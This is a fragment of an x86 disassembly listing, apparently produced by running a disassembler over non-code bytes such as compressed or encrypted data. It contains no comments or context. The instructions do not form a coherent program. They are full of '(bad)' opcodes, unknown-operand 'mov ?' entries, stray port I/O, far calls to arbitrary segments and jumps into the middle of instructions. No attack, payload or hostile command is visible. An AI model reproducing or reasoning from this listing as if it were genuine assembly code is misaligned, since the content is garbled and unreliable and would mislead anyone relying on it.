  6a6303:	xor    edi,esi
  6a6305:	xor    ch,BYTE PTR ds:0x5c84eab6
  6a630b:	push   ss
  6a630c:	shl    DWORD PTR [eax+edi*2-0x6cfb1022],cl
  6a6313:	xchg   ebp,eax
  6a6314:	mov    esp,0xeb78fd2e
  6a6319:	and    ebx,DWORD PTR [ebp+0x27]
  6a631c:	(bad)  
  6a631e:	shr    DWORD PTR [eax-0x48],cl
  6a6321:	dec    ebp
  6a6322:	and    BYTE PTR [edx-0x15],0xa1
  6a6326:	lds    edi,FWORD PTR ds:0x9b3c08e8
  6a632c:	inc    ecx
  6a632d:	jno    0x6a62d9
  6a632f:	icebp  
  6a6330:	sub    edx,ebp
  6a6332:	push   ebp
  6a6333:	fldcw  WORD PTR [edx+0x5a]
  6a6336:	in     al,dx
  6a6337:	lea    edi,[edx]
  6a6339:	inc    edx
  6a633a:	call   0xadabf74c
  6a633f:	loopne 0x6a6389
  6a6341:	push   ebx
  6a6342:	sbb    dl,BYTE PTR [edi-0x5d]
  6a6345:	push   0x7e
  6a6347:	ss push esi
  6a6349:	adc    ebp,DWORD PTR ds:0x384cd65a
  6a634f:	je     0x6a6308
  6a6351:	stos   BYTE PTR es:[edi],al
  6a6352:	mov    esp,0x5f35fcf2
  6a6357:	sbb    DWORD PTR [esi+0x20],ebp
  6a635a:	and    eax,0x3c246a87
  6a635f:	push   edx
  6a6360:	adc    eax,0x67815ba8
  6a6365:	jge    0x6a63ab
  6a6367:	js     0x6a63be
  6a6369:	pop    edi
  6a636a:	(bad)  
  6a636b:	mov    bl,0x36
  6a636d:	(bad)  
  6a636e:	std    
  6a636f:	call   0x2bc7:0xeefaab37
  6a6376:	kunpckbw k0,k4,k6
  6a637a:	adc    eax,0x2ef3348e
  6a637f:	outs   dx,DWORD PTR ds:[esi]
  6a6380:	xchg   esp,eax
  6a6381:	push   esp
  6a6382:	xor    al,0x25
  6a6384:	xor    al,BYTE PTR [ecx-0x9]
  6a6387:	data16 stos BYTE PTR es:[edi],al
  6a6389:	mov    ds:0xcc456613,eax
  6a638e:	jo     0x6a634c
  6a6390:	iret   
  6a6391:	pop    esi
  6a6392:	out    0x5d,eax
  6a6394:	stc    
  6a6395:	xchg   edx,eax
  6a6396:	scas   eax,DWORD PTR es:[edi]
  6a6397:	(bad)  
  6a6398:	cs (bad) 
  6a639a:	or     bh,BYTE PTR [edx]
  6a639c:	mov    eax,0x1f195dd8
  6a63a1:	loope  0x6a638a
  6a63a3:	test   BYTE PTR [ebx+0x77],ah
  6a63a6:	add    al,0x46
  6a63a8:	in     al,dx
  6a63a9:	sbb    DWORD PTR [eax-0x4c],esi
  6a63ac:	mov    dl,0xfd
  6a63ae:	mov    esp,DWORD PTR [edx+ebx*8+0x46]
  6a63b2:	xchg   esi,eax
  6a63b3:	out    dx,al
  6a63b4:	mov    ?,esp
  6a63b6:	or     al,0x6d
  6a63b8:	add    al,0x23
  6a63ba:	mov    esi,0xcfcf388c
  6a63bf:	fisub  DWORD PTR [edx-0x558ca19c]
  6a63c5:	in     al,0x1f
  6a63c7:	ds and cl,cl
  6a63ca:	outs   dx,DWORD PTR ds:[esi]
  6a63cb:	push   cs
  6a63cc:	icebp  
  6a63cd:	pusha  
  6a63ce:	imul   ecx,DWORD PTR [edi-0x454e5d85],0x5
  6a63d5:	mov    bl,0xe0
  6a63d7:	or     al,0x7c
  6a63d9:	mov    BYTE PTR [edi-0x1],dl
  6a63dc:	cmp    esi,DWORD PTR [ecx+0x7507baaf]
  6a63e2:	scas   eax,DWORD PTR es:[edi]
  6a63e3:	lods   al,BYTE PTR ds:[esi]
  6a63e4:	in     eax,dx
  6a63e5:	push   ebx
  6a63e6:	sbb    ebx,DWORD PTR [ecx]
  6a63e8:	pop    eax
  6a63e9:	inc    edi
  6a63ea:	xchg   esp,eax
  6a63eb:	mov    ebx,0x280d32c4
  6a63f0:	adc    DWORD PTR [edi-0x7b],0x1902899c
  6a63f7:	inc    edx
  6a63f8:	mov    al,ds:0x9551647b
  6a63fd:	push   ecx
  6a63fe:	test   eax,0x77b888c4
  6a6403:	inc    esp
  6a6404:	mov    ds:0x16b9228b,al
  6a6409:	je     0x6a6468
  6a640b:	ins    DWORD PTR es:[edi],dx
  6a640c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a640d:	dec    esi
  6a640e:	enter  0xb153,0x6e
  6a6412:	sti    
  6a6413:	cdq    
  6a6414:	xchg   BYTE PTR [esp+eax*2+0x1],dl
  6a6418:	lds    ebp,FWORD PTR [ecx-0x73]
  6a641b:	mov    edx,edx
  6a641d:	and    DWORD PTR [ebx+ebp*1],ebx
  6a6420:	mov    al,ds:0xcaccaac0
  6a6425:	adc    al,0x9c
  6a6427:	or     esp,esp
  6a6429:	icebp  
  6a642a:	in     al,0x8c
  6a642c:	cmp    BYTE PTR [edx-0x6b],dh
  6a642f:	call   0xa5d0:0x19093621
  6a6436:	neg    DWORD PTR [ebp-0x3719d3ee]
  6a643c:	aaa    
  6a643d:	sti    
  6a643e:	retf   
  6a643f:	or     eax,ecx
  6a6441:	cdq    
  6a6442:	and    eax,0x919cad2d
  6a6447:	icebp  
  6a6448:	mov    DWORD PTR [edx-0x3b3b599],ebx
  6a644e:	mov    edi,DWORD PTR [ebp-0x1d2bdb99]
  6a6454:	inc    ebx
  6a6455:	(bad)  
  6a6456:	loop   0x6a63f1
  6a6458:	sub    DWORD PTR [ebx-0x3e],ecx
  6a645b:	mov    al,ds:0x55f37bde
  6a6460:	inc    DWORD PTR gs:[ebp+edi*8-0x65]
  6a6465:	out    0x97,al
  6a6467:	(bad)  
  6a6468:	pop    ebp
  6a6469:	and    al,0x4
  6a646b:	pop    esi
  6a646c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a646d:	xchg   ebp,eax
  6a646e:	dec    ecx
  6a646f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a6470:	popa   
  6a6471:	sti    
  6a6472:	in     eax,0x7
  6a6474:	inc    esp
  6a6475:	dec    esp
  6a6476:	add    eax,0x2491d746
  6a647b:	xor    ecx,0xffffffe3
  6a647e:	jb     0x6a6428
  6a6480:	and    eax,eax
  6a6482:	sub    DWORD PTR [ebx+0x24],ebp
  6a6485:	imul   edx,DWORD PTR [eax+0x7f662824],0xae1508ea
  6a648f:	int3   
  6a6490:	ss ret 
  6a6492:	jbe    0x6a642e
  6a6494:	(bad)  
  6a6495:	das    
  6a6496:	pop    edi
  6a6497:	adc    DWORD PTR [eax+0x24],eax
  6a649a:	xchg   edx,eax
  6a649b:	fisttp QWORD PTR [eax-0x290621d1]
  6a64a1:	pop    edx
  6a64a2:	dec    edx
  6a64a3:	shl    BYTE PTR [ecx-0x78],0xfa
  6a64a7:	(bad)  
  6a64a8:	mov    dl,0x49
  6a64aa:	jne    0x6a6526
  6a64ac:	cmp    esp,DWORD PTR [edx]
  6a64ae:	push   ds
  6a64af:	imul   ebp,DWORD PTR [esi+0x29],0xf0fd98cf
  6a64b6:	retf   0x32cc
  6a64b9:	jge    0x6a6486
  6a64bb:	xor    DWORD PTR [edx+eax*8+0x6],edx
  6a64bf:	call   0xa199:0x82e2e0ab
  6a64c6:	mov    eax,0xb034de7c
  6a64cb:	adc    BYTE PTR [eax],ah
  6a64cd:	pop    edx
  6a64ce:	ret    
  6a64cf:	leave  
  6a64d0:	push   0x9ae56798
  6a64d5:	xchg   DWORD PTR [ecx+ecx*2+0x5e],esp
  6a64d9:	cmp    DWORD PTR [esi-0x17da5707],edx
  6a64df:	mov    dl,0xd5
  6a64e1:	cmp    ah,BYTE PTR [ebx]
  6a64e3:	sbb    esp,0x73
  6a64e6:	sub    DWORD PTR [edi+0x38],esi
  6a64e9:	pusha  
  6a64ea:	and    al,0x33
  6a64ec:	ret    0x4e3b
  6a64ef:	xor    ch,ch
  6a64f1:	xchg   esp,eax
  6a64f2:	lock cmp bh,BYTE PTR es:[esi+ecx*1-0xe8958e]
  6a64fb:	or     BYTE PTR [edx],bl
  6a64fd:	call   0xec91b94d
  6a6502:	mov    esp,0xac18e9e2
  6a6507:	push   edi
  6a6508:	adc    ebp,ebp
  6a650a:	jg     0x6a6560
  6a650c:	pop    edx
  6a650d:	add    ch,BYTE PTR [ecx]
  6a650f:	retf   
  6a6510:	push   esp
  6a6511:	push   0x45
  6a6513:	xchg   DWORD PTR [eax+0x242eaf9e],ebx
  6a6519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a651a:	retf   0x68c8
  6a651d:	xor    ebx,DWORD PTR [edi]
  6a651f:	(bad)  
  6a6520:	fisub  DWORD PTR [edx+0x5efa561c]
  6a6526:	xchg   ecx,eax
  6a6527:	pop    ebx
  6a6528:	push   ebx
  6a6529:	fsub   QWORD PTR [ecx]
  6a652b:	fmul   st,st(5)
  6a652d:	cmp    DWORD PTR [ecx],0xf928b787
  6a6533:	dec    esi
  6a6534:	push   ebx
  6a6535:	pop    ebx
  6a6536:	jmp    0x5405:0x73dd8ce2
  6a653d:	mov    eax,ds:0x85889bfa
  6a6542:	repz lea ebx,[edx+0x644c7267]
  6a6549:	inc    edi
  6a654a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a654b:	sub    eax,0xea1dc63a
  6a6550:	sbb    BYTE PTR [ebx],ch
  6a6552:	fst    QWORD PTR [eax]
  6a6554:	jmp    0x6a65ca
  6a6556:	jge    0x6a6596
  6a6558:	jl     0x6a64db
  6a655a:	mov    ah,0x9
  6a655c:	imul   ebp,DWORD PTR [ecx+0x60d37420],0xffffffd7
  6a6563:	dec    ecx
  6a6564:	dec    ebx
  6a6565:	and    eax,0xcfcf5bef
  6a656a:	pushf  
  6a656b:	xchg   ebp,eax
  6a656c:	dec    esi
  6a656d:	inc    ebp
  6a656e:	aas    
  6a656f:	imul   ecx,edx,0xa00d26a
  6a6575:	push   edi
  6a6576:	out    0x48,al
  6a6578:	std    
  6a6579:	push   cs
  6a657a:	test   DWORD PTR [ecx+0x1b09abf2],eax
  6a6580:	(bad)  
  6a6581:	shl    DWORD PTR [ebx-0x4981916f],1
  6a6587:	pop    esi
  6a6588:	and    eax,0xe9847cd9
  6a658d:	inc    ebp
  6a658e:	xchg   edx,eax
  6a658f:	in     al,dx
  6a6590:	mov    ebp,0x1034a736
  6a6595:	das    
  6a6596:	mov    edx,0x6a630b79
  6a659b:	mov    edi,0x71c54c9f
  6a65a0:	sbb    edi,eax
  6a65a2:	popa   
  6a65a3:	pop    esp
  6a65a4:	test   DWORD PTR [esi-0x4e],ebx
  6a65a7:	pop    es
  6a65a8:	and    DWORD PTR [ebx],ebp
  6a65aa:	xor    cl,BYTE PTR [ecx+0x142d79ac]
  6a65b0:	xor    ebp,DWORD PTR [edi-0xc4f09ed]
  6a65b6:	adc    al,0xb7
  6a65b8:	mov    dl,0x6d
  6a65ba:	out    dx,al
  6a65bb:	sub    bl,dh
  6a65bd:	inc    ebx
  6a65be:	sub    ch,BYTE PTR [ebx]
  6a65c0:	push   edx
  6a65c1:	cmp    al,BYTE PTR [edi+eax*4-0x58]
  6a65c5:	stc    
  6a65c6:	push   edx
  6a65c7:	loopne 0x6a65f6
  6a65c9:	les    ebx,FWORD PTR [ecx+0x4a13a0b9]
  6a65cf:	mov    DWORD PTR [ebp+0xa],ecx
  6a65d2:	mov    esi,0x9ab03240
  6a65d7:	adc    al,0x4e
  6a65d9:	ins    BYTE PTR es:[edi],dx
  6a65da:	daa    
  6a65db:	xchg   edx,eax
  6a65dc:	push   ebx
  6a65dd:	push   ecx
  6a65de:	pushf  
  6a65df:	adc    eax,0xa4a97f8a
  6a65e4:	cld    
  6a65e5:	jge    0x6a65eb
  6a65e7:	stc    
  6a65e8:	inc    ebx
  6a65e9:	test   BYTE PTR [ebx+0x5c9b4078],dh
  6a65ef:	mov    ds:0x182e8aa7,al
  6a65f4:	shl    BYTE PTR [edx-0x1c],0xb1
  6a65f8:	into   
  6a65f9:	js     0x6a6623
  6a65fb:	test   bh,0xf7
  6a65fe:	das    
  6a65ff:	xor    ecx,esi
  6a6601:	aam    0x85
  6a6603:	dec    ebp
  6a6604:	cmp    DWORD PTR [ebp+ecx*2-0x8],esi
  6a6608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a6609:	call   esp
  6a660b:	xchg   ecx,eax
  6a660c:	leave  
  6a660d:	div    DWORD PTR [edi]
  6a660f:	(bad)  
  6a6610:	pusha  
  6a6611:	popf   
  6a6612:	sub    al,0x27
  6a6614:	mov    bl,0xaa
  6a6616:	push   edx
  6a6617:	sbb    DWORD PTR [edi+0x836da13],ebx
  6a661d:	int3   
  6a661e:	jns    0x6a65df
  6a6620:	mov    eax,ss:0x329478b5
  6a6626:	rcr    DWORD PTR [esi+0x2f1f7f54],cl
  6a662c:	cmp    bl,ch
  6a662e:	push   edx
  6a662f:	pop    si
  6a6631:	mov    ah,0xdc
  6a6633:	shr    BYTE PTR [edx+0x40],cl
  6a6636:	add    al,0xa9
  6a6638:	clc    
  6a6639:	adc    al,BYTE PTR [edx]
  6a663b:	pop    ebp
  6a663c:	ds mov al,0x9f
  6a663f:	and    DWORD PTR [ebx-0x6c],ecx
  6a6642:	bound  esp,QWORD PTR [eax]
  6a6644:	dec    esp
  6a6645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a6646:	sbb    edx,DWORD PTR [esi+0x43d62f53]
  6a664c:	enter  0xdbb9,0x20
  6a6650:	mov    ds:0x3938a79b,eax
  6a6655:	jns    0x6a6670
  6a6657:	aad    0x68
  6a6659:	inc    edi
  6a665a:	dec    esi
  6a665b:	dec    eax
  6a665c:	add    dl,0xe5
  6a665f:	std    
  6a6660:	stc    
  6a6661:	or     BYTE PTR [ebp+0x373424ea],ch
  6a6667:	nop
  6a6668:	clc    
  6a6669:	cdq    
  6a666a:	sub    DWORD PTR [eax-0x768bba49],ecx
  6a6670:	popa   
  6a6671:	dec    eax
  6a6672:	rcr    ecx,0x7c
  6a6675:	call   0x8599:0x6e2dd736
  6a667c:	adc    BYTE PTR [eax],cl
  6a667e:	mov    ebp,0x472dda7e
  6a6683:	jae    0x6a6684
  6a6685:	ins    BYTE PTR es:[edi],dx
  6a6686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a6687:	pop    es
  6a6688:	dec    edi
  6a6689:	(bad)  
  6a668a:	ror    DWORD PTR [ecx-0x78293ad2],1
  6a6690:	adc    eax,0x19d08891
  6a6695:	test   al,0xb3
  6a6697:	rcr    ch,0x27
  6a669a:	pop    ds
  6a669b:	pop    esp
  6a669c:	rol    BYTE PTR [edi+ebp*1+0x67],cl
  6a66a0:	mov    ebx,0x5a0ec787
  6a66a5:	loop   0x6a6631
  6a66a7:	out    0x14,eax
  6a66a9:	add    BYTE PTR [ecx],al
  6a66ab:	mov    bl,dh
  6a66ad:	sbb    edx,DWORD PTR [ebp+0x1b]
  6a66b0:	(bad)  [esi+0x4f1c07fe]
  6a66b6:	(bad)  
  6a66b7:	jge    0x6a66dc
  6a66b9:	test   al,0x4b
  6a66bb:	or     dh,ah
  6a66bd:	push   0x94d816ff
  6a66c2:	scas   al,BYTE PTR es:[edi]
  6a66c3:	and    ebp,0xffffffac
  6a66c6:	push   0xffffffc7
  6a66c8:	icebp  
  6a66c9:	jo     0x6a66f2
  6a66cb:	in     eax,dx
  6a66cc:	dec    ebx
  6a66cd:	mov    dh,0x57
  6a66cf:	cmp    dh,BYTE PTR [edx-0x4b4633e8]
  6a66d5:	fisttp DWORD PTR [ebx+0x5f203743]
  6a66db:	inc    edi
  6a66dc:	pop    ds
  6a66dd:	mov    dl,0xc5
  6a66df:	pop    ebp
  6a66e0:	jnp    0x6a6741
  6a66e2:	outs   dx,DWORD PTR ds:[esi]
  6a66e3:	les    ebx,FWORD PTR [ecx]
  6a66e5:	sahf   
  6a66e6:	pop    es
  6a66e7:	outs   dx,DWORD PTR ds:[esi]
  6a66e8:	imul   ebp,DWORD PTR [ecx],0xab2f243
  6a66ee:	cmc    
  6a66ef:	out    0xac,eax
  6a66f1:	cmp    DWORD PTR [edx+0x4e10fe36],edi
  6a66f7:	or     BYTE PTR [edx],dl
  6a66f9:	ins    BYTE PTR es:[edi],dx
  6a66fa:	inc    ebx
  6a66fb:	call   0x7423:0x64bb97da
  6a6702:	xor    BYTE PTR [eax-0x5b98b147],bh
  6a6708:	adc    eax,0x4a267823
  6a670d:	mov    al,0x95
  6a670f:	aad    0xf1
  6a6711:	aad    0x87
  6a6713:	mov    edi,0x4d174187
  6a6718:	imul   ebx,edi,0xf970a197
  6a671e:	mov    ebx,0x5e616fd7
  6a6723:	out    dx,al
  6a6724:	pusha  
  6a6725:	shl    DWORD PTR [esp+ecx*8+0x3a],cl
  6a6729:	gs mov dl,0x49
  6a672c:	xchg   ebx,eax
  6a672d:	jb     0x6a6708
  6a672f:	aaa    
  6a6730:	jnp    0x6a6736
  6a6732:	arpl   WORD PTR ds:0x7399ac0c,si
  6a6738:	arpl   cx,di
  6a673a:	test   ebp,eax
  6a673c:	fisubr DWORD PTR [esi+0x67fb9c2a]
  6a6742:	leave  
  6a6743:	pop    ss
  6a6744:	jl     0x6a6793
  6a6746:	out    0xbb,al
  6a6748:	mov    al,0x75
  6a674a:	sub    BYTE PTR ds:0xc0ddbe5d,0xf
  6a6751:	adc    al,0x8c
  6a6753:	pop    ebp
  6a6754:	ret    0xd456
  6a6757:	dec    ebp
  6a6758:	pop    ss
  6a6759:	adc    ah,BYTE PTR [eax-0x46]
  6a675c:	(bad)  
  6a675d:	imul   ebp,DWORD PTR [esi+0x531da88f],0xffffffd6
  6a6764:	popa   
  6a6765:	dec    eax
  6a6766:	add    DWORD PTR [ecx*2-0x3ec78644],esi
  6a676d:	stc    
  6a676e:	shr    BYTE PTR [edx+0x3a],cl
  6a6771:	sub    DWORD PTR [esp+ebx*2+0x57],ecx
  6a6775:	xor    eax,0x9abeb794
  6a677a:	gs sub dh,al
  6a677d:	push   edx
  6a677e:	das    
  6a677f:	jne    0x6a6769
  6a6781:	dec    eax
  6a6782:	(bad)  
  6a6783:	dec    edi
  6a6784:	ret    0xc5d6
  6a6787:	loopne 0x6a679d
  6a6789:	(bad)  
  6a678a:	cdq    
  6a678b:	jnp    0x6a67cd
  6a678d:	mov    eax,0xbb726e13
  6a6792:	sbb    eax,0x17e761cd
  6a6797:	out    0xd2,eax
  6a6799:	pop    eax
  6a679a:	aam    0x6b
  6a679c:	dec    ebx
  6a679d:	mov    edi,0xa161e81c
  6a67a2:	dec    esp
  6a67a3:	int3   
  6a67a4:	(bad)  
  6a67a5:	mov    cl,0x51
  6a67a7:	xchg   ebx,eax
  6a67a8:	push   esi
  6a67a9:	pop    ebx
  6a67aa:	push   edi
  6a67ab:	mov    BYTE PTR [eax+0x5b084524],dh
  6a67b1:	xchg   edi,eax
  6a67b2:	jle    0x6a6807
  6a67b4:	retf   0x5aa7
  6a67b7:	xchg   ecx,eax
  6a67b9:	aaa    
  6a67ba:	(bad)
  6a67be:	jg     0x6a679c
  6a67c0:	adc    ecx,DWORD PTR [ebx+0x1b171bc9]
  6a67c6:	fld    QWORD PTR [edi+0xd]
  6a67c9:	stc    
  6a67ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a67cb:	or     ecx,DWORD PTR ds:0x6805b345
  6a67d1:	adc    BYTE PTR [esi],0x71
  6a67d4:	sbb    eax,0x94e03726
  6a67d9:	adc    eax,0x232bafdc
  6a67de:	jnp    0x6a678e
  6a67e0:	push   ebp
  6a67e1:	sub    DWORD PTR [eax+0x6d5b762d],ebp
  6a67e7:	pop    eax
  6a67e8:	xchg   esi,ecx
  6a67ea:	push   ds
  6a67eb:	test   eax,0xbf1e0579
  6a67f0:	outs   dx,DWORD PTR ds:[esi]
  6a67f1:	repnz dec ebp
  6a67f3:	mov    ?,WORD PTR [edi+ebp*1-0x79]
  6a67f7:	cmp    ebp,DWORD PTR [esp+ebx*1+0x29f5c0d3]
  6a67fe:	adc    eax,0xd3a57b0d
  6a6803:	mov    ?,WORD PTR [ebx]
  6a6805:	mov    ecx,0xa3a65dc5
  6a680a:	retf   
  6a680b:	out    dx,al
  6a680c:	or     eax,0xa847297e
  6a6811:	dec    esp
  6a6812:	ret    0xb4e8
  6a6815:	mov    dl,0xb9
  6a6817:	mov    WORD PTR [ecx+0x29],ss
  6a681a:	lds    ebx,FWORD PTR [ebx-0x223130c]
  6a6820:	jno    0x6a67d9
  6a6822:	mov    dh,0xf9
  6a6824:	adc    bh,dh
  6a6826:	mov    es,WORD PTR [ebx+0x4d]
  6a6829:	add    al,0xf2
  6a682b:	popa   
  6a682c:	repnz and esi,ebp
  6a682f:	scas   al,BYTE PTR es:[edi]
  6a6830:	push   eax
  6a6831:	and    dh,ch
  6a6833:	js     0x6a6847
  6a6835:	push   esp
  6a6836:	push   edi
  6a6837:	retf   0xb5e9
  6a683a:	adc    bl,BYTE PTR [ecx]
  6a683c:	fadd   QWORD PTR [ecx]
  6a683e:	or     eax,DWORD PTR [edi]
  6a6840:	call   0x7593:0xaf4d789c
  6a6847:	ds pop ecx
  6a6849:	sub    DWORD PTR [ecx+0x50086a70],0x27c93aff
  6a6853:	push   0xfffffff5
  6a6855:	mov    eax,ds:0x463d3373
  6a685a:	out    dx,eax
  6a685b:	sub    DWORD PTR [esi],esp
  6a685d:	clc    
  6a685e:	int    0x88
  6a6860:	(bad)  
  6a6861:	sbb    al,0x19
  6a6863:	adc    BYTE PTR [edi-0x67376ecd],bh
  6a6869:	(bad)  
  6a686b:	inc    DWORD PTR [ebx+0x649d2c13]
  6a6871:	data16 cpuid 
  6a6874:	daa    
  6a6875:	sbb    BYTE PTR [esi],ch
  6a6877:	mov    al,0x2
  6a6879:	fcom   st(2)
  6a687b:	sub    ch,BYTE PTR [esi+0x29]
  6a687e:	add    BYTE PTR [edi],0x62
  6a6881:	pop    ecx
  6a6882:	imul   ecx,DWORD PTR [edi],0x21
  6a6885:	leave  
  6a6886:	(bad)  
  6a6887:	sbb    bl,BYTE PTR [edx]
  6a6889:	or     al,0xd6
  6a688b:	dec    esp
  6a688c:	pop    eax
  6a688d:	out    0x53,al
  6a688f:	jmp    0x6a68bb
  6a6891:	mov    cl,0x19
  6a6893:	jno    0x6a6877
  6a6895:	dec    ebx
  6a6896:	mov    bl,0xde
  6a6898:	or     dl,BYTE PTR [ebx]
  6a689a:	(bad)  
  6a689c:	inc    edx
  6a689d:	pop    es
  6a689e:	lahf   
  6a689f:	imul   esp,ebx,0x7b
  6a68a2:	idiv   BYTE PTR [edi]
  6a68a4:	aas    
  6a68a5:	ss mov bl,0xe4
  6a68a8:	daa    
  6a68a9:	jne    0x6a687a
  6a68ab:	or     bl,BYTE PTR ds:0x4415b5ce
  6a68b1:	cmp    al,0x3
  6a68b3:	cdq    
  6a68b4:	cdq    
  6a68b5:	jmp    0x35a82699
  6a68ba:	dec    edi
  6a68bb:	inc    esi
  6a68bc:	sbb    DWORD PTR [esi-0x6dbf0c40],esi
  6a68c2:	rcr    DWORD PTR [ebx],1
  6a68c4:	jge    0x6a6901
  6a68c6:	jne    0x6a6877
  6a68c8:	int    0x63
  6a68ca:	(bad)  [ebp-0x72]
  6a68cd:	(bad)  
  6a68ce:	pop    edi
  6a68cf:	sub    eax,0x7fcebf21
  6a68d4:	ins    BYTE PTR es:[edi],dx
  6a68d5:	mov    ds:0x2434bb41,eax
  6a68da:	hlt    
  6a68db:	mov    ch,0x7d
  6a68dd:	mov    BYTE PTR [ecx+0x58903132],dh
  6a68e3:	mov    cl,0x4c
  6a68e5:	bound  ebx,QWORD PTR [esi]
  6a68e7:	in     al,0xfb
  6a68e9:	xchg   DWORD PTR [esp+ebp*4+0x290551e5],edi
  6a68f0:	ss leave 
  6a68f2:	jbe    0x6a68d1
  6a68f4:	jne    0x6a693c
  6a68f6:	jecxz  0x6a68b3
  6a68f8:	mov    cs,WORD PTR ds:0x141067d5
  6a68fe:	outs   dx,BYTE PTR ds:[esi]
  6a68ff:	adc    eax,0x53e7a94d
  6a6904:	and    WORD PTR [esi],dx
  6a6907:	jae    0x6a6927
  6a6909:	repnz les esi,FWORD PTR [eax]
  6a690c:	adc    ebx,eax
  6a690e:	fcomip st,st(6)
  6a6910:	dec    ebp
  6a6911:	cmc    
  6a6912:	adc    eax,0xe90b4d27
  6a6917:	and    ebp,edx
  6a6919:	leave  
  6a691a:	mov    al,0x1f
  6a691c:	out    dx,eax
  6a691d:	cmp    al,BYTE PTR [eax]
  6a691f:	mov    ds:0x63e92a24,al
  6a6924:	or     dh,BYTE PTR [ebx]
  6a6926:	in     al,dx
  6a6927:	and    BYTE PTR [ebp+0x41],dl
  6a692a:	xchg   edx,eax
  6a692b:	mov    esp,0x25eac5b2
  6a6930:	ret    
  6a6931:	call   0x4f0a61b0
  6a6936:	ret    0x2dfd
  6a6939:	fwait
  6a693a:	jmp    0x6a6964
  6a693c:	rcr    DWORD PTR [ebp-0x6a],0xdd
  6a6940:	aad    0x12
  6a6942:	aas    
  6a6943:	pop    eax
  6a6944:	xchg   ebx,eax
  6a6945:	into   
  6a6946:	lods   al,BYTE PTR ds:[esi]
  6a6947:	sub    DWORD PTR [esi-0x77fcf249],ecx
  6a694d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a694e:	lahf   
  6a694f:	gs cs mov cl,0x10
  6a6953:	mov    bh,0xef
  6a6955:	in     eax,0xcc
  6a6957:	mov    ah,0x33
  6a6959:	stos   DWORD PTR es:[edi],eax
  6a695a:	mov    al,0x7e
  6a695c:	sub    al,0x41
  6a695e:	sub    DWORD PTR [ebx+0x51],eax
  6a6961:	out    dx,eax
  6a6962:	jae    0x6a6923
  6a6964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a6965:	rol    DWORD PTR [ebp-0x69],cl
  6a6968:	push   ecx
  6a6969:	data16 mov ss,WORD PTR [esp+ebp*4]
  6a696d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a696e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a696f:	and    DWORD PTR [ebp-0x6ea2d337],0xa467421c
  6a6979:	adc    dl,BYTE PTR [edx]
  6a697b:	mov    dl,0x53
  6a697d:	std    
  6a697e:	popf   
  6a697f:	xchg   BYTE PTR fs:[edi+0x3c],bh
  6a6983:	cdq    
  6a6984:	(bad)  
  6a6985:	push   ds
  6a6986:	pop    ds
  6a6987:	imul   edx,DWORD PTR [eax],0xc7fbd705
  6a698d:	and    eax,0xe845e66e
  6a6992:	inc    esp
  6a6993:	fild   WORD PTR [edi-0x68061850]
  6a6999:	fdivr  QWORD PTR [esi-0x70cbfff8]
  6a699f:	scas   eax,DWORD PTR es:[edi]
  6a69a0:	cmp    al,0x98
  6a69a2:	out    dx,eax
  6a69a3:	sub    DWORD PTR [ecx-0x6f],0xfffffff4
  6a69a7:	mov    edx,0x3f521ec7
  6a69ac:	jg     0x6a694d
  6a69ae:	jecxz  0x6a69e8
  6a69b0:	lods   al,BYTE PTR ds:[esi]
  6a69b1:	retf   0x7057
  6a69b4:	into   
  6a69b5:	bound  edx,QWORD PTR [ecx]
  6a69b7:	(bad)  
  6a69b9:	jl     0x6a6941
  6a69bb:	add    BYTE PTR [ebp-0x5d],dl
  6a69be:	mov    esp,0xb7f83c03
  6a69c3:	xor    BYTE PTR [ebx+0x7133b901],cl
  6a69c9:	(bad)  
  6a69ca:	pop    ebp
  6a69cb:	nop
  6a69cc:	in     eax,dx
  6a69cd:	sahf   
  6a69ce:	sbb    al,0xaf
  6a69d0:	add    DWORD PTR [ecx+edx*2],0xfdf148e8
  6a69d7:	inc    ebx
  6a69d8:	xor    DWORD PTR [ecx+0x12],esi
  6a69db:	(bad)  
  6a69dd:	mov    bh,0x94
  6a69df:	adc    ah,BYTE PTR [edx]
  6a69e1:	nop
  6a69e2:	pop    esp
  6a69e3:	sti    
  6a69e4:	jae    0x6a69a6
  6a69e6:	in     eax,dx
  6a69e7:	sub    DWORD PTR [edx+0x65f848e1],esp
  6a69ed:	add    eax,ecx
  6a69ef:	xor    DWORD PTR [esi-0x25bffa39],eax
  6a69f5:	push   ebx
  6a69f6:	mov    ch,0xdd
  6a69f8:	jp     0x6a69dc
  6a69fa:	sbb    al,BYTE PTR [esi]
  6a69fc:	(bad)  
  6a69fd:	out    dx,eax
  6a69fe:	das    
  6a69ff:	jns    0x6a69e2
  6a6a01:	mov    al,0x36
  6a6a03:	and    eax,0xdecd6ef0
  6a6a08:	pop    ecx
  6a6a09:	sub    ah,ah
  6a6a0b:	inc    esp
  6a6a0c:	dec    esi
  6a6a0d:	out    0x16,eax
  6a6a0f:	and    al,0xf1
  6a6a11:	popa   
  6a6a12:	xchg   ebx,eax
  6a6a13:	mov    BYTE PTR [edx],ah
  6a6a15:	mov    es,WORD PTR [esi+0x56]
  6a6a18:	mov    ds:0xdd692da0,eax
  6a6a1d:	and    ebx,ebx
  6a6a1f:	jo     0x6a6a9a
  6a6a21:	sbb    BYTE PTR [eax],0x6a
  6a6a24:	sub    al,0x5d
  6a6a26:	mov    ch,0x8a
  6a6a28:	push   cs
  6a6a29:	add    edi,ebp
  6a6a2b:	inc    edi
  6a6a2c:	inc    ebp
  6a6a2d:	xor    edx,edi
  6a6a2f:	loope  0x6a69d6
  6a6a31:	dec    edi
  6a6a32:	jmp    0x6a69c9
  6a6a34:	ficomp WORD PTR [esi+0x1dd6d51e]
  6a6a3a:	std    
  6a6a3b:	cmp    DWORD PTR [esi+0x6c],esp
  6a6a3e:	cld    
  6a6a3f:	(bad)  
  6a6a41:	imul   esi,DWORD PTR [edi-0x2d],0x8b2a0641
